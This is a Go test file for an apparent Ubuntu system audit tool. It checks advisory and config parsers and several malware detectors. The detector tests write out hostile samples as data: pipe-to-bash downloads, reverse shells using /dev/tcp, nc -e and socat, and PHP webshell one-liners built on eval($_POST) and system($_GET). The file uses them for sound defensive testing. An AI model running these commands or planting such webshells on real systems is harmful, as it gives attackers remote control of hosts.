package checks

import (
	"os"
	"strings"
	"testing"
	"unicode"

	"ubuntu-sys-audit/internal/model"
)

const nginxPage = `<html><body><ul>
<li><p>Buffer overflow when using alias with rewrite<br>Severity: medium<br><a href="https://example/K1">Advisory</a><br><a href="https://www.cve.org/CVERecord?id=CVE-2026-15176">CVE-2026-15176</a><br>Not vulnerable: 1.31.7+, 1.30.6+<br>Vulnerable: 0.1.29-1.31.6</p></li>
<li><p>Old windows bug<br>Severity: major<br><a href="x">CVE-2010-0001</a><br>Not vulnerable: 0.8.33+<br>Vulnerable: nginx/Windows 0.7.52-0.8.32</p></li>
<li><p>Two ranges<br>Severity: high<br><a href="x">CVE-2020-0002</a><br>Not vulnerable: 1.19.3+, 1.18.1+<br>Vulnerable: 1.3.9-1.4.0, 1.18.0</p></li>
<li><p>Everything<br>Severity: low<br><a href="x">CVE-2009-0003</a><br>Vulnerable: all</p></li>
<li><p>Navigation entry, not an advisory</p></li>
</ul></body></html>`

func containsHan(s string) bool {
	return strings.ContainsFunc(s, func(r rune) bool { return unicode.Is(unicode.Han, r) })
}

func TestUITextIsEnglish(t *testing.T) {
	for _, c := range All() {
		if containsHan(c.Name) {
			t.Errorf("check %s has a non English name: %s", c.ID, c.Name)
		}
	}
	for _, sev := range model.AllSeverities {
		if containsHan(sev.Label()) {
			t.Errorf("severity label not English: %s", sev.Label())
		}
	}
	for _, cat := range model.Categories {
		if containsHan(cat.Label()) {
			t.Errorf("category label not English: %s", cat.Label())
		}
	}
}

func TestPlural(t *testing.T) {
	for _, c := range []struct {
		n    int
		noun string
		want string
	}{
		{1, "CVE", "1 CVE"},
		{0, "CVE", "0 CVEs"},
		{2, "security notice", "2 security notices"},
		{1, "nginx.org advisory", "1 nginx.org advisory"},
		{23, "nginx.org advisory", "23 nginx.org advisories"},
	} {
		if got := plural(c.n, c.noun); got != c.want {
			t.Errorf("plural(%d, %q) = %q, want %q", c.n, c.noun, got, c.want)
		}
	}
}

func TestPasswordStatusIsNotRedacted(t *testing.T) {
	// Redact masks "password=x" and "password: x". Account evidence must avoid
	// those forms, or every status would show as ***.
	line := "alice  uid=1000  shell=/bin/bash  password " + passwordLabel(ShadowEntry{Status: "locked"})
	if got := model.Redact(line); got != line {
		t.Errorf("status was masked: %q", got)
	}
}

func TestParseNginxAdvisories(t *testing.T) {
	got := parseNginxAdvisories(nginxPage)
	if len(got) != 4 {
		t.Fatalf("want 4 advisories, got %d: %+v", len(got), got)
	}
	if got[0].Title != "Buffer overflow when using alias with rewrite" || got[0].Severity != "medium" ||
		got[0].CVEs[0] != "CVE-2026-15176" || got[0].NotVulnerable != "1.31.7+, 1.30.6+" {
		t.Errorf("first entry parsed wrong: %+v", got[0])
	}
}

func TestNginxAffects(t *testing.T) {
	advs := parseNginxAdvisories(nginxPage)
	rangeAdv, windows, two, all := advs[0], advs[1], advs[2], advs[3]
	cases := []struct {
		name string
		adv  nginxAdvisory
		ver  string
		want bool
	}{
		{"inside mainline range", rangeAdv, "1.31.6", true},
		{"mainline fixed", rangeAdv, "1.31.7", false},
		{"old stable inside range", rangeAdv, "1.24.0", true},
		{"stable branch patched though numerically in range", rangeAdv, "1.30.6", false},
		{"stable branch not yet patched", rangeAdv, "1.30.5", true},
		{"below range", rangeAdv, "0.1.28", false},
		{"newer than range", rangeAdv, "1.33.0", false},
		{"windows only range ignored", windows, "0.8.0", false},
		{"single version listed", two, "1.18.0", true},
		{"second range", two, "1.4.0", true},
		{"between ranges", two, "1.10.0", false},
		{"all", all, "1.2.3", true},
		{"garbage version never matches", all, "abc", false},
	}
	for _, c := range cases {
		if got := c.adv.Affects(c.ver); got != c.want {
			t.Errorf("%s: Affects(%s) = %v, want %v", c.name, c.ver, got, c.want)
		}
	}
}

func TestAssessPHP(t *testing.T) {
	active, err := parsePHPActive([]byte(`{"8":{"8.2":{"version":"8.2.35","tags":["security"]},"8.3":{"version":"8.3.36","tags":[]}}}`))
	if err != nil {
		t.Fatal(err)
	}
	if s, rel := assessPHP("8.3.10", active); s != "behind" || rel.Version != "8.3.36" {
		t.Errorf("behind: %q %+v", s, rel)
	}
	if s, _ := assessPHP("8.3.36", active); s != "" {
		t.Errorf("current: %q", s)
	}
	if s, _ := assessPHP("7.4.33", active); s != "eol" {
		t.Errorf("eol: %q", s)
	}
	if _, err := parsePHPActive([]byte(`{}`)); err == nil {
		t.Error("empty response must fail")
	}
}

func TestParseShadowDiscardsHash(t *testing.T) {
	got := parseShadow("root:$6$salt$hashvalue:19000:0:99999:7:::\nbad::19000::::::\nlocked:!$y$j9T$x$y:19000::::::\nsvc:*:19000::::::\nold:$1$ab$cd:19000::::::\n")
	if got["root"].Status != "password" || got["root"].Algo != "sha512" || got["root"].LastChange != 19000 {
		t.Errorf("root: %+v", got["root"])
	}
	if got["bad"].Status != "empty" {
		t.Errorf("bad: %+v", got["bad"])
	}
	if got["locked"].Status != "locked" || got["svc"].Status != "locked" {
		t.Errorf("locked: %+v %+v", got["locked"], got["svc"])
	}
	if got["old"].Algo != "md5" {
		t.Errorf("old: %+v", got["old"])
	}
}

func TestIsLoginShell(t *testing.T) {
	for shell, want := range map[string]bool{
		"/bin/bash": true, "/usr/bin/zsh": true, "/usr/sbin/nologin": false, "/bin/false": false,
		"/bin/sync": false, "": true, "/usr/bin/git-shell": false, "/sbin/nologin": false,
	} {
		if got := isLoginShell(shell); got != want {
			t.Errorf("isLoginShell(%q) = %v", shell, got)
		}
	}
}

func TestMaliciousLinePatterns(t *testing.T) {
	bad := []string{
		"* * * * * root curl -fsSL http://x.example/a.sh | bash",
		"*/5 * * * * wget -q -O- http://x/y | sudo sh",
		"@reboot bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"nc -e /bin/sh 10.0.0.1 4444",
		`python3 -c 'import socket,os,pty;s=socket.socket()'`,
		"echo aGVsbG8= | base64 -d | bash",
		"socat tcp:1.2.3.4:53 exec:/bin/sh",
	}
	for _, l := range bad {
		if matchMalicious(l) == "" {
			t.Errorf("should flag: %s", l)
		}
	}
	good := []string{
		"17 * * * * root cd / && run-parts --report /etc/cron.hourly",
		"curl -fsS https://example.com/healthcheck > /dev/null",
		"0 3 * * * root /usr/bin/certbot renew --quiet",
		"curl https://example.com/x -o /opt/x.tar.gz",
		"[ -x /usr/bin/php ] && /usr/lib/php/sessionclean",
		"nc -z localhost 5432",
	}
	for _, l := range good {
		if name := matchMalicious(l); name != "" {
			t.Errorf("should not flag %q (matched %s)", l, name)
		}
	}
}

func TestReferencesTempExec(t *testing.T) {
	yes := []string{"* * * * * root /tmp/.x/run", "@reboot /dev/shm/a", "*/5 * * * * root bash /var/tmp/up.sh"}
	for _, l := range yes {
		if !referencesTempExec(l) {
			t.Errorf("should flag: %s", l)
		}
	}
	no := []string{
		"0 1 * * * root /usr/bin/backup > /tmp/backup.log 2>&1",
		"0 2 * * * root find /tmp -type f -mtime +7 -delete",
		"0 3 * * * root rm -rf /tmp/cache",
		"0 3 * * * root /usr/bin/backup",
	}
	for _, l := range no {
		if referencesTempExec(l) {
			t.Errorf("should not flag: %s", l)
		}
	}
}

func TestParseAuthorizedKey(t *testing.T) {
	line := `from="10.0.0.1",command="/usr/bin/backup --flag" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ user@host extra`
	opts, typ, blob, comment, ok := parseAuthorizedKey(line)
	if !ok || typ != "ssh-ed25519" || blob != "AAAAC3NzaC1lZDI1NTE5AAAAIJ" || comment != "user@host extra" ||
		!strings.Contains(opts, `command="/usr/bin/backup --flag"`) {
		t.Errorf("opts=%q typ=%q blob=%q comment=%q ok=%v", opts, typ, blob, comment, ok)
	}
	for _, bad := range []string{"", "# comment", "not a key"} {
		if _, _, _, _, ok := parseAuthorizedKey(bad); ok {
			t.Errorf("should reject %q", bad)
		}
	}
	if fingerprint("!!!") != "invalid key" {
		t.Error("invalid base64 should not panic or produce a fingerprint")
	}
	// Matches ssh-keygen -lf for this well known test vector shape.
	if !strings.HasPrefix(fingerprint("AAAA"), "SHA256:") {
		t.Error("fingerprint prefix")
	}
}

func TestParseFileCaps(t *testing.T) {
	// VFS_CAP_REVISION_2 with cap_setuid (bit 7) permitted.
	setuid := []byte{0, 0, 0, 2, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
	danger, any := parseFileCaps(setuid)
	if !any || len(danger) != 1 || danger[0] != "cap_setuid" {
		t.Errorf("setuid: %v %v", danger, any)
	}
	// cap_net_raw (bit 13) only, as on /usr/bin/ping.
	netRaw := []byte{1, 0, 0, 2, 0, 0x20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
	danger, any = parseFileCaps(netRaw)
	if !any || len(danger) != 0 {
		t.Errorf("net_raw: %v %v", danger, any)
	}
	if _, any := parseFileCaps([]byte{1, 2}); any {
		t.Error("short xattr must not parse")
	}
}

func TestParseMountSkips(t *testing.T) {
	mi := `22 1 8:1 / / rw,relatime - overlay overlay rw
23 22 0:5 / /proc rw - proc proc rw
24 22 0:6 / /mnt/share\040data rw - nfs4 srv:/x rw
25 22 7:0 / /snap/core/1 ro - squashfs /dev/loop0 ro
26 22 8:2 / /data rw - ext4 /dev/sda2 rw
27 22 0:30 / /var/lib/docker/overlay2/abc/merged rw - overlay overlay rw
28 22 0:31 / /dev/shm rw - tmpfs tmpfs rw
29 22 0:32 / /mnt/x rw - fuse.sshfs srv: rw
`
	got := parseMountSkips(mi)
	for _, want := range []string{"/proc", "/mnt/share data", "/snap/core/1", "/var/lib/docker/overlay2/abc/merged", "/mnt/x"} {
		if !got[want] {
			t.Errorf("%s should be skipped: %v", want, got)
		}
	}
	for _, keep := range []string{"/", "/data", "/dev/shm"} {
		if got[keep] {
			t.Errorf("%s must be scanned", keep)
		}
	}
}

func TestParseUtmp(t *testing.T) {
	rec := make([]byte, utmpSize)
	rec[0] = utUserProc
	copy(rec[utOffLine:], "pts/0")
	copy(rec[utOffUser:], "alice")
	copy(rec[utOffHost:], "203.0.113.9")
	rec[utOffTime] = 1
	dead := make([]byte, utmpSize)
	dead[0] = utDeadProc
	got := parseUtmp(append(rec, dead...))
	if len(got) != 1 || got[0].User != "alice" || got[0].Line != "pts/0" || got[0].Host != "203.0.113.9" {
		t.Errorf("parsed: %+v", got)
	}
}

func TestAuthLogPatterns(t *testing.T) {
	m := authAccepted.FindStringSubmatch("Oct 31 10:00:00 h sshd[123]: Accepted publickey for root from 203.0.113.9 port 5000 ssh2: ED25519 SHA256:x")
	if m == nil || m[1] != "publickey" || m[2] != "root" || m[3] != "203.0.113.9" {
		t.Errorf("accepted: %v", m)
	}
	m = authAccepted.FindStringSubmatch("2026-10-31T10:00:00+08:00 h sshd-session[9]: Accepted password for bob from 10.0.0.5 port 1 ssh2")
	if m == nil || m[2] != "bob" {
		t.Errorf("accepted on 24.04+: %v", m)
	}
	m = authFailed.FindStringSubmatch("Oct 31 10:00:00 h sshd[1]: Failed password for invalid user admin from 198.51.100.7 port 2 ssh2")
	if m == nil || m[3] != "198.51.100.7" {
		t.Errorf("failed: %v", m)
	}
	m = authFailed.FindStringSubmatch("Oct 31 10:00:00 h sshd[1]: Invalid user test from 198.51.100.8 port 2")
	if m == nil || m[3] != "198.51.100.8" {
		t.Errorf("invalid: %v", m)
	}
}

func TestWebshellRules(t *testing.T) {
	cases := map[string]model.Severity{
		`<?php @eval($_POST['x']); ?>`:                 model.Critical,
		`<?php system($_GET["cmd"]);`:                  model.Critical,
		`<?php $_REQUEST['a']($_REQUEST['b']);`:        model.Critical,
		`<?php assert(base64_decode($_COOKIE['c']));`:  model.Critical,
		`$key="e45e329feb5d925b";`:                     model.Critical,
		`<?php eval(gzinflate(base64_decode('abc')));`: model.High,
		`<?php preg_replace("/.*/e", $x, "");`:         model.High,
	}
	for src, want := range cases {
		got, name := matchWebshell([]byte(src))
		if name == "" || got != want {
			t.Errorf("%q: got %v (%s), want %v", src, got, name, want)
		}
	}
	benign := []string{
		`<?php echo htmlspecialchars($_GET['q']); ?>`,
		`<?php $x = system_info(); evaluate($y);`,
		`<?php exec('ls -la'); // fixed command`,
		`<?php if (isset($_POST['eval'])) { save($_POST['eval']); }`,
		`<?php preg_replace('/abc/', 'd', $s);`,
	}
	for _, src := range benign {
		if _, name := matchWebshell([]byte(src)); name != "" {
			t.Errorf("false positive on %q: %s", src, name)
		}
	}
}

func TestIsPackagedAlias(t *testing.T) {
	links := map[string]string{
		"/lib/systemd/systemd-udevd": "/usr/bin/udevadm",
		"/usr/sbin/auditd":           "/usr/bin/dash",
		"/sbin/mingetty":             "/usr/bin/unrelated",
	}
	resolve := func(p string) (string, error) {
		if real, ok := links[p]; ok {
			return real, nil
		}
		return "", os.ErrNotExist
	}
	packaged := map[string]bool{
		"/lib/systemd/systemd-udevd": true, "/usr/bin/udevadm": true, "/usr/bin/dash": true,
		"/sbin/mingetty": true, "/usr/bin/unrelated": true, "/sbin/udevd": true,
	}
	owned := func(p string) bool { return packaged[p] }
	cases := []struct {
		name, argv0, exe string
		want             bool
	}{
		{"udev multi-call binary", "/lib/systemd/systemd-udevd", "/usr/bin/udevadm", true},
		{"usrmerge spelling of the same binary", "/lib/systemd/systemd-udevd", "/bin/../usr/bin/udevadm", false},
		{"symlink created by an attacker", "/usr/sbin/auditd", "/usr/bin/dash", false},
		{"packaged name pointing at another binary", "/sbin/mingetty", "/usr/bin/dash", false},
		{"BPFDoor style name with no such file", "/sbin/udevd", "/dev/shm/.udevd", false},
		{"unpackaged binary behind a packaged name", "/lib/systemd/systemd-udevd", "/dev/shm/.udevd", false},
		{"relative name", "systemd-udevd", "/usr/bin/udevadm", false},
	}
	for _, c := range cases {
		if got := isPackagedAlias(c.argv0, c.exe, resolve, owned); got != c.want {
			t.Errorf("%s: got %v, want %v", c.name, got, c.want)
		}
	}
}

func TestPathIsProcessExe(t *testing.T) {
	self, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	if !pathIsProcessExe(os.Getpid(), self) {
		t.Errorf("%s should match this process", self)
	}
	for _, path := range []string{"/proc/self/status", "/no/such/file", "relative/path"} {
		if pathIsProcessExe(os.Getpid(), path) {
			t.Errorf("%s should not match this process", path)
		}
	}
}

func TestWantVerifyCoversRustCoreutils(t *testing.T) {
	for _, path := range []string{
		"/usr/bin/ssh", "/usr/sbin/sshd", "/usr/lib/openssh/sshd-session",
		"/usr/lib/cargo/bin/coreutils/ls", "/usr/libexec/coreutils/libstdbuf.so",
		"/usr/lib/x86_64-linux-gnu/security/pam_unix.so", "/usr/lib/aarch64-linux-gnu/libkeyutils.so.1.10",
	} {
		if !wantVerify(path) {
			t.Errorf("%s must be verified", path)
		}
	}
	if wantVerify("/usr/share/doc/foo/README") {
		t.Error("documentation should not be hashed")
	}
	for _, path := range []string{"/usr/lib/cargo/bin/coreutils/ls", "/usr/bin/sudo.ws", "/usr/lib/x86_64-linux-gnu/security/pam_unix.so"} {
		if !keyBinary.MatchString(path) {
			t.Errorf("%s should rank as a key binary", path)
		}
	}
}

func TestIsUploadedPHP(t *testing.T) {
	cases := []struct {
		path string
		size int64
		want bool
	}{
		{"/var/www/html/uploads/shell.php", 5000, true},
		{"/var/www/html/wp-content/uploads/2024/03/x.php", 900, true},
		{"/var/www/html/upload/a.phtml", 900, true},
		{"/var/www/html/wp-content/uploads/index.php", 28, false},
		{"/var/www/html/wp-content/uploads/index.php", 9000, true},
		{"/var/www/html/wp-content/plugins/foo/upload/handler.php", 900, false},
		{"/var/www/html/vendor/acme/uploads/Manager.php", 900, false},
		{"/var/www/app/Http/Controllers/Upload/Store.php", 900, false},
		{"/var/www/html/images/logo.php", 900, false},
		{"/var/www/html/index.php", 900, false},
	}
	for _, c := range cases {
		if got := isUploadedPHP(c.path, c.size); got != c.want {
			t.Errorf("isUploadedPHP(%q, %d) = %v, want %v", c.path, c.size, got, c.want)
		}
	}
}

func TestParseNginxConfig(t *testing.T) {
	conf := parseNginxTokens(`
# comment with root /nope;
user www-data;
http {
    server_tokens off;
    ssl_protocols TLSv1 TLSv1.2;
    server {
        listen 443 ssl;
        root "/var/www/my site";
        location /files { autoindex on; }
        location ~ \.php$ { fastcgi_pass unix:/run/php/php8.1-fpm.sock; }
    }
}`)
	if len(conf.Roots) != 1 || conf.Roots[0] != "/var/www/my site" {
		t.Errorf("roots: %v", conf.Roots)
	}
	if conf.ServerTokens != "off" || !conf.Autoindex {
		t.Errorf("server_tokens=%q autoindex=%v", conf.ServerTokens, conf.Autoindex)
	}
	if len(conf.WeakTLS) != 1 || conf.WeakTLS[0] != "TLSv1" {
		t.Errorf("weak tls: %v", conf.WeakTLS)
	}
}
